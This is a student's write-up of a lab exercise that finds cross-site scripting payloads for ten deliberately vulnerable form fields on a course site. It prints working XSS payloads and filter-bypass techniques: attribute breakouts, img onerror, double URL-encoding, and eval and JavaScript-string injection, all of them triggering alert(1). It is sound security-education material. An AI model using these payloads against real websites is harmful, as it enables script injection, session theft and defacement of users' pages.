# Exercise - Black-box discovery of XSS exploits

The goal here is to visit https://331.cybersec.fun/xss.php, which contains 10 input fields and a submit button. The challenge is to break all 10 of these inputs via manual testing. For each injection point, we must find an exploit to display a popup message on the webpage.

## Form 1
- I first tried sending the payload `<script>alert(1)</script>`, and noticed that the response was `alert(1)`. This means our input is being sanitized and reflected.
- I tried using a mix of upper and lowercase with`<sCrIpT>`, with the same result.
- Next, I tried `<img src=x>`, which was also removed.
- I then tried `<iframe>`, which did render an iframe! This is our way to perform XSS!
- The payload `<iframe onload=alert(1)>` works.

## Form 2
Tried sending `aaaa`, and noticed nothing was printed in response. However, when inspecting the response, I noticed this:
```HTML
Response 2 (CVE-2021-24884) 9.6 (CVSS 3.x):
  <a href="https://example.com" data-frmverify="aaaa">
```
So we can see that our input is placed in the `data-frmverify` attribute of the `<a>` tag. This means that if quotes aren't sanitized we can escape this and inject code. Some example payloads are:
- `" onmouseover=alert(1)> aaa`
- `"><img src=x onerror=alert(1)>` (This one triggers as soon as the page loads so I prefer it)

## Form 3
With the same approach as the previous form, we can see that an input of `aaa` returns:
```HTML
<a href="aaa"> Click me</a>
```
Meaning that a similar approach the the previous form could work (and it does). The payload `"><img src=x onerror=alert(1)>` works!

## Form 4
With this form, we can see that our input is being reflected. The payload `<img src=x onerror=alert(1)>` works!

## Form 5
The response here is similar to forms 2 and 3:
```html
<input type='checkbox' name='vuln_form' value='aaa'>
```
If we try escaping the value field with the payload `" onload=alert(1)`, we can see that our `"` is being sanitized as it's not letting us escape the attribute:
```HTML
	<input type='checkbox' name='vuln_form' value='" onload=alert(1)'>
```
However, if we instead try a `'` instead it does work:
```HTML
<input type='checkbox' name='vuln_form' value='' onload='alert(1)'>
```
However, the `onload` event doesn't trigger for this type. If we use the onmouseover event then our alert is displayed whenever the user mouses over the checkbox: `' onmouseover='alert(1)`.

If we try escaping the tags with `'><img src=x onerror='alert(1)`, we can see that the `<>` characters are also being sanitized:
```HTML
<input type='checkbox' name='vuln_form' value=''&gt;&lt;img src=x onerror='alert(1)'>
```
Even if we send this as their url encoded counterparts `%3c` and `%3e`, we get the same response. It is considered sufficient if we can trigger XXS with user input, so the `onmouseover` payload was considered fine.

## Form 6
This form echos our input back, so `aaaa` is rendered as `aaaa`. The trick here is now how to bypass the filters to execute a payload. If we send the payload `<script>alert(1)</script>`, we can see that the `<` is displayed as the html element `&lt;` and `>` is displayed as `&gt;`, meaning they are being sanitized. The payload above in url encoding is `%3cscript%3ealert(1)%3c%2fscript%3e`. By using double encoding our payload it’s possible to bypass security filters that only decode user input once. The second decoding process is executed by the backend platform or modules that properly handle encoded data, but don’t have the corresponding security checks in place. This means that if we enter our encoded payload into the form, it should be re-encoded and could bypass the sanitization filter (and it does!). The payload `%3cscript%3ealert(1)%3c%2fscript%3e` creates the following response:
```html
<script>alert(1)</script>
```

## Form 7
Inspecting our response for the `aaaa` payload shows the following:
```html
<script>eval('aaaa')</script>
```
The javascript `eval()` function takes a string and executes it as if it were javascript code. This means if we just put in the payload `alert(1)` then barring any filters this should be executed for us (how nice of them), and it does.

## Form 8
Our payload of `aaaa` is displayed on the page as:
```html
<aaaa>
```
Essentially, this form seems to wrap our input in `<>`. This means that even if these characters are being sanitized, we can take advantage of the tags that wrap our input to create a payload such as `img src=x onerror="alert(1)"`. This works, causing the following output:
```html
<img src="x" onerror="alert(1);">
```

## Form 9
Once again startin with our classic `aaaa`, we can see:
```html
<script>
	var x = '<% aaaa%>';
	var d = document.createElement('div');
	d.innerElement = x;
	document.body.appendChild(d);
</script>
```
If `'` aren't escaped, this means we should be able to escape the string defining `var x` and simply enter our own arbitrary javascript code (remembering to handle the `%>'` after our input). I decided to try the following payload: `'; alert(1); var y = '`, we obtain the following:
```html
<script>
	var x = '<% '; 
	alert(1); 
	var y = '%>';
	var d = document.createElement('div');
	d.innerElement = x;
	document.body.appendChild(d);
</script>
```
This triggers the alert successfully.

## Form 10
Once again applying the `aaaa` test, we can see the following:
```html
<img src="aaaa">
```
If we can escape the quotes, we can execute javascript code with either `onerror` or using `<script>` tags if `<>` characters aren't sanitized. Whilst `"` don't work, the `'` characters seem to be escaped incorrectly, where a literal `\` is printed and doesn't escape the single-quote. A payload of `' id=test ` is rendered as:
```html
<img src="\" id="test" '="">
```
Here it seems that the closing `'` has become an attribute of the `<img>` and is set to an empty string. This means that we can use the `onerror` attribute to execute javascript, but we can't use any other quotes as these will also be pre-pended with backslashes. Alternatively, using `<script>` tags also worked, giving us 2 payloads:
- `'><script>alert(1)</script> `
- `' onerror=alert(1) `

That's all of them :)